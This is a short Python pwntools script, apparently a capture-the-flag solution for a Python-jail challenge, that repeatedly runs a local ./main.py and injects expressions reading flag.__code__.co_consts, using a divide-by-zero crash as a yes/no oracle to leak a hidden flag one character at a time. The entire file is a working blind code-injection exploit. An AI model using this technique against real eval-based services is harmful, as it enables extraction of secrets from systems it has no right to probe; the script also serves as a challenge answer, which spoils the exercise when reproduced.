import string
from pwn import *

context.log_level = "error"

base_payload = "flag.__code__.co_consts"
check_total_len_payload = f"if len({base_payload})==LEN:1/0"
check_len_payload = f"if len({base_payload}[INDEX])==LEN:1/0"
check_char_payload = f"if {base_payload}[INDEX][OFFSET]!='CHAR':1/0"

def send_payload(payload):
    p = process("./main.py")
    p.recvuntil(b">> ")
    p.sendline(payload.encode())

    ret = None
    try:
        p.recv(2000).decode()
        ret = True
    except:
        ret = False
    p.close()
    return ret

# Find consts length
loop = True
consts_len = 0
while loop:
    if send_payload(check_total_len_payload.replace("LEN", str(consts_len))):
        loop = False
    else:
        consts_len += 1
print(f"[+] flag function has {consts_len} consts")

# Read consts char by char
flag = ""
for i in range(1, consts_len):
    # Get len of consts[i]
    loop = True
    const_len = 0
    while loop:
        if send_payload(check_len_payload.replace("INDEX", str(i)).replace("LEN", str(const_len))):
            loop = False
        else:
            const_len += 1
    # Get each char from consts[i]
    for j in range(const_len):
        for l in string.printable:
            if not send_payload(check_char_payload.replace("INDEX", str(i)).replace("OFFSET", str(j)).replace("CHAR", str(l))):
                flag += l
                print(f"[+] Found char: {l}")
                break

print(f"[+] Flag: {flag}")
